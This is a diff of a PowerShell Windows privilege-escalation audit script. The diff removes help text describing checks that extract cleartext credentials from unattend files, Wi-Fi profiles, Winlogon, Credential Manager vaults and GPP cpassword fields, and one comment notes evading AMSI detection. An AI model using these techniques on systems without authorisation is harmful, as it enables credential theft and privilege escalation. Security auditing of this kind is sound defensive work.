-    .SYNOPSIS
-
-    Helper - Extract sensitive data from an "unattend" XML file
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Unattend files are XML documents which may contain cleartext passwords if they are not
-    properly sanitized. Most of the time, "Password" fields will be replaced by the generic
-    "*SENSITIVE*DATA*DELETED*" mention but sometimes, the original value remains and is either
-    present in its plaintext form or base64-encoded form. If a non-empty password field is found
-    and if it's not equal to the default "*SENSITIVE*DATA*DELETED*", this function will return the
-    corresponding set of credentials: domain, username and (decoded) password. 
-    
-    .PARAMETER Path
-
-    The Path of the "unattend.xml" file to parse
-    
-    .EXAMPLE
-
-    PS C:\> Get-UnattendSensitiveData -Path C:\Windows\Panther\Unattend.xml
-
-    Type         Domain      Username      Password
-    ----         ------      --------      --------
-    Credentials  contoso.com Administrator Password1
-    LocalAccount N/A         John          Password1
-    AutoLogon    .           Administrator P@ssw0rd
-    
-    .NOTES 
-
-    A password can be stored in three formats:
-
-    1) Simple string
-
-        <Password>Password</Password>
-
-    2) XML node + plain value
-    
-        <Password>
-            <Value>Password</Value>
-            <PlainText>true</PlainText>
-        </Password>
-
-    3) XML node + base64-encoded value
-
-        <Password>
-            <Value>UABhAHMAcwB3AG8AcgBkAA==</Value>
-            <PlainText>false</PlainText>
-        </Password> 
-
-    /!\ UNICODE encoding!
-
-    #>
 
     [CmdletBinding()]Param(
         [Parameter(Mandatory=$True)]
@@ -2511,38 +1916,6 @@ function Get-UnattendSensitiveData {
 # BEGIN REGISTRY SETTINGS   
 # ----------------------------------------------------------------
 function Invoke-UacCheck {
-    <#
-    .SYNOPSIS
-
-    Checks whether UAC (User Access Control) is enabled
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The state of UAC can be determined based on the value of the parameter "EnableLUA" in the
-    following registry key:
-    HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    0 = Disabled
-    1 = Enabled 
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-UacCheck | fl
-
-    Path      : Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
-    EnableLUA : 1
-    Enabled   : True
-    
-    .NOTES
-
-    "UAC was formerly known as Limited User Account (LUA)."
-
-    .LINK
-
-    https://docs.microsoft.com/en-us/windows-hardware/customize/desktop/unattend/microsoft-windows-lua-settings-enablelua
-    #>
     
     [CmdletBinding()]Param()
 
@@ -2561,20 +1934,6 @@ function Invoke-UacCheck {
 }
 
 function Invoke-LapsCheck {
-    <#
-    .SYNOPSIS
-
-    Checks whether LAPS (Local Admin Password Solution) is enabled
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The status of LAPS can be check using the following registry key.
-    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft Services\AdmPwd
-
-    #>
     
     [CmdletBinding()]Param()
     
@@ -2591,44 +1950,6 @@ function Invoke-LapsCheck {
 }
 
 function Invoke-PowershellTranscriptionCheck {
-    <#
-    .SYNOPSIS
-
-    Checks whether PowerShell Transcription is configured/enabled
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Powershell Transcription is used to log PowerShell scripts execution. It can be configured 
-    thanks to the Group Policy Editor. The settings are stored in the following registry key:
-    HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-PowershellTranscriptionCheck | fl
-
-    EnableTranscripting    : 1
-    EnableInvocationHeader : 1
-    OutputDirectory        : C:\Transcripts
-    
-    .NOTES
-
-    If PowerShell Transcription is configured, the settings can be found here:
-
-    C:\>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
-
-    HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription
-        EnableTranscripting    REG_DWORD    0x1
-        OutputDirectory    REG_SZ    C:\Transcripts
-        EnableInvocationHeader    REG_DWORD    0x1
-    
-    To enable PowerShell Transcription:
-    Group Policy Editor > Administrative Templates > Windows Components > Windows PowerShell > PowerShell Transcription
-    Set an output directory and set the policy as Enabled
-
-    #>
     
     [CmdletBinding()]Param()
 
@@ -2646,20 +1967,6 @@ function Invoke-PowershellTranscriptionCheck {
 }
 
 function Invoke-RegistryAlwaysInstallElevatedCheck {
-    <#
-    .SYNOPSIS
-
-    Checks whether the AlwaysInstallElevated key is set in the registry.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    AlwaysInstallElevated can be configured in both HKLM and HKCU. Therefore, this function will
-    check these two locations and return the corresponding key if it exists and is enabled. 
-    
-    #>
     
     [CmdletBinding()]Param()
 
@@ -2692,47 +1999,6 @@ function Invoke-RegistryAlwaysInstallElevatedCheck {
 }
 
 function Invoke-LsaProtectionsCheck {
-    <#
-    .SYNOPSIS
-
-    Checks whether LSASS is configured to run as a Protected Process 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    First it reads the registry to check whether "RunAsPPL" is configured and enabled in the
-    "LSA" key. It also checks whether additional protections such as Secure Boot or Credential
-    Guard are configured / enabled. 
-    
-    .EXAMPLE
-
-    On Windows 10:
-
-    PS C:\> Invoke-LsaProtectionsCheck
-
-    Name             Status Description
-    ----             ------ -----------
-    RunAsPPL           True RunAsPPL is enabled
-    UEFI               True BIOS mode is UEFI
-    Secure Boot        True Secure Boot is enabled
-    Credential Guard  False Credential Guard is not configured
-    
-    .EXAMPLE
-
-    On Windows Server 2012 R2:
-
-    PS C:\> Invoke-LsaProtectionsCheck
-
-    Name             Status Description
-    ----             ------ -----------
-    RunAsPPL          False RunAsPPL is not configured
-    UEFI              False BIOS mode is Legacy
-    Secure Boot       False Secure Boot is not supported
-    Credential Guard  False Credential Guard is not supported on this OS
-
-    #>
     
     [CmdletBinding()]Param()
 
@@ -2744,33 +2010,6 @@ function Invoke-LsaProtectionsCheck {
 }
 
 function Invoke-WsusConfigCheck {
-    <#
-    .SYNOPSIS
-    
-    Checks whether the WSUS is enabled and vulnerable (Wsuxploit)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-    
-    A system can be compromise if the updates are not requested using HTTPS but HTTP. If the URL of
-    the update server (WUServer) starts with HTTP and UseWUServer=1, then the update requests are
-    vulnerable to MITM attacks.
-    
-    .EXAMPLE
-    
-    PS C:\> Invoke-WsusConfigCheck
-
-    WUServer     : http://acme-upd01.corp.internal.com:8535
-    UseWUServer  : 1
-    IsVulnerable : True
-    
-    .LINK
-
-    https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#wsus
-    https://github.com/pimps/wsuxploit
-    #>
 
     $WindowsUpdateRegPath = "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate"
     $WindowsUpdateAURegPath = "HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU"
@@ -2808,36 +2047,6 @@ function Invoke-WsusConfigCheck {
 # BEGIN NETWORK 
 # ----------------------------------------------------------------
 function Get-RpcRange {
-    <#
-    .SYNOPSIS
-
-    Helper - Dynamically identifies the range of randomized RPC ports from a list of ports.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    This function is a helper for the Invoke-TcpEndpointsCheck function. Windows uses a set of 
-    RPC ports that are radomly allocated in the range 49152-65535 by default. If we want to 
-    filter out these listening ports we must first figure out this set of ports. The aim of this 
-    function is to guess this range using basic statistics on a given array of port numbers. We 
-    can quite reliably identify the RPC port set because they are concentrated in a very small 
-    range. It's not 100% reliable but it will do the job most of the time.
-    
-    .PARAMETER Ports
-
-    An array of port numbers
-    
-    .EXAMPLE
-
-    PS C:\> Get-RpcRange -Ports $Ports 
-
-    MinPort MaxPort
-    ------- -------
-    49664   49672
-    
-    #>
 
     [CmdletBinding()]Param(
         [Parameter(Mandatory=$True)]
@@ -2902,51 +2111,6 @@ function Get-RpcRange {
 }
 
 function Invoke-TcpEndpointsCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates all TCP endpoints on the local machine (IPv4 and IPv6)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    It uses the custom "Get-NetworkEndpoints" function to enumerate all the TCP endpoints on the
-    local machine, IPv4 and IPv6. The list can then be filtered based on a list of known ports.
-    
-    .PARAMETER Filtered
-
-    Use this switch to filter out the list of endpoints returned by this function. The filter 
-    excludes all the standard ports such as 445 or 139 and all the random RPC ports. The RPC port
-    range is dynamically guessed using the helper function "Get-RpcRange".
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-TcpEndpointsCheck | ft
-
-    IP   Proto LocalAddress       State      PID Name
-    --   ----- ------------       -----      --- ----
-    IPv4 TCP   0.0.0.0:135        LISTENING  968 svchost
-    IPv4 TCP   0.0.0.0:445        LISTENING    4 System
-    IPv4 TCP   0.0.0.0:5040       LISTENING 5408 svchost
-    IPv4 TCP   0.0.0.0:49664      LISTENING  732 lsass
-    IPv4 TCP   0.0.0.0:49665      LISTENING  564 wininit
-    IPv4 TCP   0.0.0.0:49666      LISTENING 1208 svchost
-    IPv4 TCP   0.0.0.0:49667      LISTENING 1412 svchost
-    IPv4 TCP   0.0.0.0:49668      LISTENING 2416 spoolsv
-    IPv4 TCP   0.0.0.0:49669      LISTENING  656 services
-    IPv4 TCP   192.168.74.136:139 LISTENING    4 System
-    IPv6 TCP   [::]:135           LISTENING  968 svchost
-    IPv6 TCP   [::]:445           LISTENING    4 System
-    IPv6 TCP   [::]:49664         LISTENING  732 lsass
-    IPv6 TCP   [::]:49665         LISTENING  564 wininit
-    IPv6 TCP   [::]:49666         LISTENING 1208 svchost
-    IPv6 TCP   [::]:49667         LISTENING 1412 svchost
-    IPv6 TCP   [::]:49668         LISTENING 2416 spoolsv
-    IPv6 TCP   [::]:49669         LISTENING  656 services
-    
-    #>
 
     [CmdletBinding()]Param(
         [switch]$Filtered
@@ -2995,50 +2159,6 @@ function Invoke-TcpEndpointsCheck {
 }
 
 function Invoke-UdpEndpointsCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates all UDP endpoints on the local machine (IPv4 and IPv6)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    It uses the custom "Get-NetworkEndpoints" function to enumerate all the UDP endpoints on the
-    local machine, IPv4 and IPv6. The list can be filtered based on a list of known ports.
-    
-    .PARAMETER Filtered
-
-    Use this switch to filter out the list of endpoints returned by this function. The filter 
-    excludes all the standard ports such as 139 or 500.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-UdpEndpointsCheck | ft
-
-    IP   Proto LocalAddress                       State  PID Name
-    --   ----- ------------                       -----  --- ----
-    IPv4 UDP   0.0.0.0:5050                       N/A   5408 svchost
-    IPv4 UDP   0.0.0.0:5353                       N/A   2176 svchost
-    IPv4 UDP   0.0.0.0:5355                       N/A   2176 svchost
-    IPv4 UDP   0.0.0.0:54565                      N/A   3100 SkypeApp
-    IPv4 UDP   127.0.0.1:1900                     N/A   5088 svchost
-    IPv4 UDP   127.0.0.1:51008                    N/A   5088 svchost
-    IPv4 UDP   127.0.0.1:60407                    N/A   3052 svchost
-    IPv4 UDP   192.168.74.136:137                 N/A      4 System
-    IPv4 UDP   192.168.74.136:138                 N/A      4 System
-    IPv4 UDP   192.168.74.136:1900                N/A   5088 svchost
-    IPv4 UDP   192.168.74.136:51007               N/A   5088 svchost
-    IPv6 UDP   [::]:5353                          N/A   2176 svchost
-    IPv6 UDP   [::]:5355                          N/A   2176 svchost
-    IPv6 UDP   [::]:54565                         N/A   3100 SkypeApp
-    IPv6 UDP   [::1]:1900                         N/A   5088 svchost
-    IPv6 UDP   [::1]:51006                        N/A   5088 svchost
-    IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:1900  N/A   5088 svchost
-    IPv6 UDP   [fe80::3a:b6c0:b5f0:a05e%12]:51005 N/A   5088 svchost
-    
-    #>
     
     [CmdletBinding()]Param(
         [switch]$Filtered
@@ -3075,34 +2195,6 @@ function Invoke-UdpEndpointsCheck {
 }
 
 function Invoke-WlanProfilesCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates the saved Wifi profiles and extract the cleartext key/passphrase when applicable
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The built-in "netsh" command allows one to list the saved Wifi profiles and extract the cleartext
-    key or passphrase when applicable (e.g.: "netsh wlan show profile MyWifiProfile key=clear"). This
-    function achieves the same goal. It iterates the list of Wlan interfaces in order to enumerate
-    all the Wifi profiles which can be accessed in the context of the current user. If a network is 
-    configured with WEP or PSK authentication, it will attempt to extract the cleartext value of the
-    key or passphrase. 
-    
-    .EXAMPLE
-    
-    PS C:\> Invoke-WlanProfilesCheck
-
-    Profile        : MySecretAccessPoint
-    SSID           : MySecretAccessPoint
-    Authentication : WPA2PSK
-    PassPhrase     : AvErYsEcReTpAsSpHrAsE
-    Interface      : Compact Wireless-G USB Network Adapter
-    
-    #>
 
     [CmdletBinding()] param()
 
@@ -3225,31 +2317,6 @@ function Invoke-WlanProfilesCheck {
 # BEGIN MISC   
 # ----------------------------------------------------------------
 function Invoke-SystemInfoCheck {
-    <#
-    .SYNOPSIS
-
-    Gets the name of the operating system and the full version string.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Reads the "Product Name" from the registry and gets the full version string based on the 
-    operating system.
-    
-    .EXAMPLE
-
-    Invoke-SystemInfoCheck | fl
-
-    Name    : Windows 10 Home
-    Version : 10.0.18363 Version 1909 (18363.535)
-    
-    .LINK
-
-    https://techthoughts.info/windows-version-numbers/
-
-    #>
     
     [CmdletBinding()] param()
 
@@ -3277,49 +2344,6 @@ function Invoke-SystemInfoCheck {
 }
 
 function Invoke-SystemStartupHistoryCheck {
-    <#
-    .SYNOPSIS
-
-    Gets a list of all the system startup events which occurred in the given time span.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    It uses the Event Log to get a list of all the events that indicate a system startup. The start
-    event of the Event Log service is used as a reference.
-    
-    .PARAMETER TimeSpanInDays
-
-    An optional parameter indicating the time span to check in days. e.g.: check the last 31 days.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-SystemStartupHistoryCheck
-
-    Index Time
-    ----- ----
-         1 2020-01-11 - 21:36:59
-         2 2020-01-08 - 08:45:01
-         3 2020-01-07 - 11:45:43
-         4 2020-01-06 - 14:43:41
-         5 2020-01-05 - 23:07:41
-         6 2020-01-05 - 11:41:39
-         7 2020-01-04 - 14:18:46
-         8 2020-01-04 - 14:18:10
-         9 2020-01-04 - 12:51:51
-        10 2020-01-03 - 10:41:15
-        11 2019-12-27 - 13:57:30
-        12 2019-12-26 - 10:56:38
-        13 2019-12-25 - 12:12:14
-        14 2019-12-24 - 17:41:04
-    
-    .NOTES
-
-    Event ID 6005: The Event log service was started, i.e. system startup theoretically.
-
-    #>
     
     [CmdletBinding()] param(
         [int]
@@ -3353,35 +2377,6 @@ function Invoke-SystemStartupHistoryCheck {
 }
 
 function Invoke-SystemStartupCheck {
-    <#
-    .SYNOPSIS
-    
-    Gets the last system startup time
-    
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Gets the tickcount in milliseconds thanks to the GetTickCount64 Win32 function and substracts
-    the value to the current date. This yields the date and time of the last system startup. The 
-    result is returned in a custom PS Object containing a string representation of the DateTime
-    object. 
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-SystemStartupCheck
-
-    Time
-    ----
-    2020-01-11 - 21:36:41
-
-    .NOTES
-
-    [Environment]::TickCount is a 32-bit signed integer
-    The max value it can hold is 49.7 days. That's why GetTickCount64() is used instead.
-    
-    #>
     
     [CmdletBinding()] param() 
 
@@ -3400,29 +2395,6 @@ function Invoke-SystemStartupCheck {
 }
 
 function Invoke-SystemDrivesCheck {
-    <#
-    .SYNOPSIS
-
-    Gets a list of local drives and network shares that are currently mapped
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    This function is a wrapper for the "Get-PSDrive" standard cmdlet. For each result returned by 
-    "Get-PSDrive", a custom PS object is returned, indicating the drive letter (if applicable), the
-    display name (if applicable) and the description.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-SystemDrivesCheck 
-
-    Root DisplayRoot Description
-    ---- ----------- -----------
-    C:\              OS
-    E:\              DATA
-    #>
     
     [CmdletBinding()] param()
 
@@ -3442,33 +2414,6 @@ function Invoke-SystemDrivesCheck {
 }
 
 function Invoke-LocalAdminGroupCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates the members of the default local admin group
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    For every member of the local admin group, it will check whether it's a local/domain user/group.
-    If it's local it will also check if the account is enabled. 
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-LocalAdminGroupCheck
-
-    Name          Type IsLocal IsEnabled
-    ----          ---- ------- ---------
-    Administrator User    True     False
-    lab-admin     User    True      True
-    
-    .NOTES
-
-    S-1-5-32-544 = SID of the local admin group 
-
-    #>
 
     [CmdletBinding()] param()
 
@@ -3601,30 +2546,6 @@ function Invoke-LocalAdminGroupCheck {
 }
 
 function Invoke-UsersHomeFolderCheck {
-    <#
-    .SYNOPSIS
-    
-    Enumerates the local user home folders.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Enumerates the folders located in C:\Users\. For each one, this function checks whether the 
-    folder is readable and/or writable by the current user. 
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-UsersHomeFolderCheck
-
-    HomeFolderPath         Read Write
-    --------------         ---- -----
-    C:\Users\Lab-Admin    False False
-    C:\Users\Lab-User      True  True
-    C:\Users\Public        True  True
-    
-    #>
 
     [CmdletBinding()] param()
     
@@ -3656,35 +2577,6 @@ function Invoke-UsersHomeFolderCheck {
 }
 
 function Invoke-MachineRoleCheck {
-    <#
-    .SYNOPSIS
-
-    Gets the role of the machine (workstation, server, domain controller)
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The role of the machine can be checked by reading the following registry key:
-    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ProductOptions
-    The "ProductType" value represents the role of the machine.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-MachineRoleCheck
-
-    Name  Role       
-    ----  ----       
-    WinNT WorkStation
-    
-    .NOTES
-
-    WinNT = workstation
-    LanmanNT = domain controller
-    ServerNT = server
-
-    #>
     
     [CmdletBinding()] param()
 
@@ -3711,28 +2603,6 @@ function Invoke-MachineRoleCheck {
 }
 
 function Invoke-WindowsUpdateCheck {
-    <#
-    .SYNOPSIS
-
-    Gets the last update time of the machine.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    The Windows Update status can be queried thanks to the Microsoft.Update.AutoUpdate COM object.
-    It gives the last successful search time and the last successfull update installation time.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-WindowsUpdateCheck
-
-    Time
-    ----
-    2020-01-12 - 09:17:37
-
-    #>
     
     [CmdletBinding()] param()
 
@@ -3759,27 +2629,6 @@ function Invoke-WindowsUpdateCheck {
 # BEGIN CURRENT USER   
 # ----------------------------------------------------------------
 function Invoke-UserCheck {
-    <#
-    .SYNOPSIS
-
-    Gets the usernane and SID of the current user
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Gets the usernane and SID of the current user
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-UserCheck
-
-    Name                     SID
-    ----                     ---
-    DESKTOP-FEOHNOM\lab-user S-1-5-21-1448366976-598358009-3880595148-1002
-
-    #>
     
     [CmdletBinding()] param()
     
@@ -3792,32 +2641,6 @@ function Invoke-UserCheck {
 }
 
 function Invoke-UserGroupsCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates groups the current user belongs to except default and low-privileged ones
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    For each group the current user belongs to, a custom object is returned, indicating the name
-    and the SID of the group.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-UserGroupsCheck
-
-    Name                            SID                                         
-    ----                            ---                                         
-    BUILTIN\Remote Management Users S-1-5-32-580 
-
-    .LINK
-
-    https://support.microsoft.com/en-us/help/243330/well-known-security-identifiers-in-windows-operating-systems
-    https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/81d92bba-d22b-4a8c-908a-554ab29148ab
-    #>
     
     [CmdletBinding()] param()
 
@@ -3913,38 +2736,6 @@ function Invoke-UserGroupsCheck {
 }
 
 function Invoke-UserPrivilegesCheck {
-    <#
-    .SYNOPSIS
-    
-    Enumerates privileges which can be abused for privilege escalation
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Enumerates all the privileges of the current user thanks to the custom Get-UserPrivileges
-    function. Then, it checks whether each privilege is contained in a pre-defined list of 
-    high value privileges. 
-    
-    .EXAMPLE
-
-    Name                   State   Description
-    ----                   -----   -----------
-    SeImpersonatePrivilege Enabled Impersonate a client after authentication
-    
-    .NOTES
-
-    Interesting privileges:
-
-        - SeAssignPrimaryTokenPrivilege
-        - SeImpersonatePrivilege
-        - SeCreateTokenPrivilege
-        - SeDebugPrivilege
-        - SeLoadDriverPrivilege
-        - SeRestorePrivilege
-        - SeTakeOwnershipPrivilege
-    #>
 
     [CmdletBinding()] param()    
 
@@ -3962,20 +2753,6 @@ function Invoke-UserPrivilegesCheck {
 }
 
 function Invoke-UserEnvCheck {
-    <#
-    .SYNOPSIS
-
-    Checks for sensitive data in environment variables
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Environment variables may contain sensitive information such as database credentials or API 
-    keys. 
-    
-    #>
 
     [CmdletBinding()] param() 
 
@@ -4009,34 +2786,6 @@ function Invoke-UserEnvCheck {
 # BEGIN CREDENTIALS     
 # ----------------------------------------------------------------
 function Invoke-WinlogonCheck {
-    <#
-    .SYNOPSIS
-
-    Checks credentials stored in the Winlogon registry key
-    
-    Author: @itm4n
-    License: BSD 3-Clause
-
-    .DESCRIPTION
-
-    Windows has a registry setting to enable automatic logon. You can set a username and a password
-    in order to automatically initiate a user session on system startup. The password is stored in
-    clear text so it's easy to extract it. This function returns a set of credentials only if the 
-    password field is not empty.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-WinlogonCheck
-
-    Domain Username  Password
-    ------ --------  --------
-           lab-admin
-
-    .LINK
-
-    https://support.microsoft.com/en-us/help/324737/how-to-turn-on-automatic-logon-in-windows
-    
-    #>
 
     [CmdletBinding()] param()
 
@@ -4067,31 +2816,6 @@ function Invoke-WinlogonCheck {
 }
 
 function Invoke-CredentialFilesCheck {
-    <#
-    .SYNOPSIS
-
-    List the Credential files that are stored in the current user AppData folders. 
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Credentials stored in the Credential Manager are actually saved as files in the current user's
-    home folder. The sensitive information is saved in an ecnrypted format which differs depending
-    on the credential type. 
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-CredentialFilesCheck
-
-    FullPath
-    ------
-    C:\Users\lab-user\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
-    C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials\9751D70B4AC36953347138F9A5C2D23B
-    C:\Users\lab-user\AppData\Roaming\Microsoft\Credentials\9970C9D5A29B2D83514BEFD30A4D48B4
-    
-    #>
     
     [CmdletBinding()] param()
 
@@ -4139,50 +2863,6 @@ function Invoke-CredentialFilesCheck {
 }
 
 function Invoke-VaultCredCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates the credentials saved in the Credential Manager.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Credentials saved in the Credential Manager can be extracted by invoking the Win32 CredEnumerate
-    function. This function returns a pointer to an array of PCREDENTIAL pointers. Therefore we can
-    iterate this array to access each CREDENTIAL structure individually. Depending on the type of 
-    credential, the CredentialBlob member either contains the cleartext password or a blob which we
-    cannot decode (because it's application specific). For each structure, a custom PS object is 
-    returned. The output should be quite similar to the output generated by the command vault::cred
-    in M*m*k*tz (don't want to trigger AMSI with this keyword :P).
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-VaultCredCheck
-
-    TargetName : Domain:target=192.168.0.10
-    UserName   : LAB-PC\lab-user
-    Comment    : SspiPfc
-    Type       : 2 - DOMAIN_PASSWORD
-    Persist    : 3 - ENTERPRISE
-    Flags      : 0
-    Credential :
-    
-    TargetName : LegacyGeneric:target=https://github.com/
-    UserName   : user@example.com
-    Comment    :
-    Type       : 1 - GENERIC
-    Persist    : 2 - LOCAL_MACHINE
-    Flags      : 0
-    Credential : dBa2F06TTsrvSeLbyoW8
-
-    .LINK
-
-    https://docs.microsoft.com/en-us/windows/win32/api/wincred/nf-wincred-credenumeratew
-    https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
-
-    #>
     
     [CmdletBinding()] param()
 
@@ -4301,38 +2981,6 @@ function Invoke-VaultCredCheck {
 }
 
 function Invoke-VaultListCheck {
-    <#
-    .SYNOPSIS
-
-    Enumerates web credentials saved in the Credential Manager.
-
-    Author: @itm4n
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Credentials saved in Internet Explorer or Edge for example are actually saved in the system's 
-    Credential Manager. These credentials can be extracted using undocumented Windows API functions
-    from "vaultcli.dll". It's highly inspired from the "vault::list" command of M*m*k*tz (by 
-    Benjamin Delpy @gentilkiwi) and "Get-VaultCredential.ps1" (by Matthew Graeber @mattifestation). 
-    Only entries containing a non-empty password field are returned as a custom PS object. 
-
-    .EXAMPLE
-
-    PS C:\> Invoke-VaultListCheck
-
-    Type        : Web Credentials
-    TargetName  : https://github.com/
-    UserName    : foo123@example.com
-    Credential  : foo123
-    LastWritten : 01/01/1970 13:37:00
-
-    .LINK
-
-    https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/kuhl_m_vault.c
-    https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Get-VaultCredential.ps1
-
-    #>
     
 
     [CmdletBinding()] param()
@@ -4543,82 +3191,6 @@ function Invoke-VaultListCheck {
 }
 
 function Invoke-GPPPasswordCheck {
-    <#
-    .SYNOPSIS
-
-    Lists Group Policy Preferences (GPP) containing a non-empty "cpassword" field
-
-    Author: @itm4n
-    Credit: @obscuresec, @harmj0y
-    License: BSD 3-Clause
-    
-    .DESCRIPTION
-
-    Before KB2928120 (see MS14-025), some Group Policy Preferences could be configured with a 
-    custom account. This feature was mainly used to deploy a custom local administrator account on
-    a group of machines. There were two problems with this approach though. First, since the Group 
-    Policy Objects are stored as XML files in SYSVOL, any domain user can read them. The second 
-    problem is that the password set in these GPPs is AES256-encrypted with a default key, which 
-    is publicly documented. This means that any authenticated user could potentially access very 
-    sensitive data and elevate their privileges on their machine or even the domain. 
-
-    This function will check whether any locally cached GPP file contains a non-empty "cpassword" 
-    field. If so, it will decrypt it and return a custom PS object containing some information 
-    about the GPP along with the location of the file. 
-    
-    .PARAMETER Remote
-
-    Set this flag if you want to search for GPP files in the SYSVOL share of your primary Domain
-    Controller. Initially, I wanted to do only local checks but this was a special request from
-    @mpgn_x64 so I couldn't say no :P.
-    
-    .EXAMPLE
-
-    PS C:\> Invoke-GPPPasswordCheck
-
-    Type     : Mapped Drive
-    UserName : shareuser
-    Password : S3cur3Shar3
-    Content  : Path: \\evilcorp.lab\SecureShare
-    Changed  : 2020-02-09 14:03:57
-    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{3A61470B-FD38-462A-A2E2-FC279A2754AE}\S-1-5-21-2135246055-3766984803-592010092-1103\Preferences\Drives\Drives.xml
-
-    Type     : Data Source
-    UserName : datasource
-    Password : S0urce0fThePr0blem
-    Content  : DSN: source
-    Changed  : 2020-02-09 12:23:43
-    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{3FC99437-7C06-491A-8EBC-786CDA055862}\S-1-5-21-2135246055-3766984803-592010092-1103\Preferences\DataSources\DataSources.xml
-
-    Type     : Service
-    UserName : EVILCORP\SvcControl
-    Password : S3cr3tS3rvic3
-    Content  : Name: CustomService
-    Changed  : 2020-02-09 12:16:18
-    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{66E11622-15A4-40B7-938C-FAD43AF1F572}\Machine\Preferences\Services\Services.xml
-
-    Type     : Scheduled Task
-    UserName : EVILCORP\SvcCustomTask
-    Password : T4skM4ster
-    Content  : App: C:\windows\system32\cmd.exe
-    Changed  : 2020-02-09 12:20:50
-    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{6E9805DA-4CFC-47AC-BFC4-216FED08D39E}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
-
-    Type     : User/Group
-    UserName : LocalAdmin
-    Password : $uper$ecureP4ss
-    Content  : Description: Super secure local admin account
-    Changed  : 2020-02-09 12:09:59
-    FilePath : C:\ProgramData\Microsoft\Group Policy\History\{8B95814A-23A2-4FB7-8BBA-53745EA1F11C}\Machine\Preferences\Groups\Groups.xml
-
-    .LINK
-
-    https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
-    https://adsecurity.org/?p=2288
-    https://docs.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025
-    https://support.microsoft.com/en-us/help/2962486/ms14-025-vulnerability-in-group-policy-preferences-could-allow-elevati
-
-    #>
 
     [CmdletBinding()] param(
